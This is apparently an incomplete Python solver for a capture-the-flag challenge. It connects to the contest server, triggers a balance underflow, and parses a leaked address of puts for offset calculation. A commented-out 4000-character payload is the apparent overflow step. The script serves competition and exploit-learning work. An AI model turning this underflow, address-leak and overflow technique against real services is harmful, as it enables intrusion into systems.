import socket, re
from time import sleep

URL = "chal.pctf.competitivecyber.club"
PORT = 4444
SLEEP_LEN = 1
RECV_SIZE = 32768


def parse_steps(fname: str):
    with open(fname, "r") as file:
        fc = file.read().split("\n")

        # filter out comment lines
        fc = filter(lambda x: len(x) != 0 and x[0] != "#", fc)
        fc = "\n".join(fc)

        # plus signs = inline newlines
        return fc.replace("+", "\n")


def connect():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((URL, PORT))

    return client_socket


def send(msg: str):
    conn.send(msg.encode())
    sleep(SLEEP_LEN)
    return conn.recv(RECV_SIZE).decode()


def run_steps(steps: str):
    steps = parse_steps(steps)
    return send(steps)


try:
    conn = connect()

    # get balance to underflow
    run_steps("1_spam_tips.txt")
    res = send("2\n3\ny\n")

    # get address of puts
    pattern = r"0x[0-9a-f]+"
    puts_addr = re.findall(pattern, res)[0]
    print(f"Address of `puts`: {puts_addr}")

    def puts_offset(addr):
        return hex(int(puts_addr, 16) + int(addr, 16))

    print(run_steps("2_write_book.txt"))

    # this part has to be done in the script,
    # because it calculates the offset
    # print(send("a" * 4000))

    # Close the socket
    conn.close()

except Exception as e:
    print(f"Error: {e}")
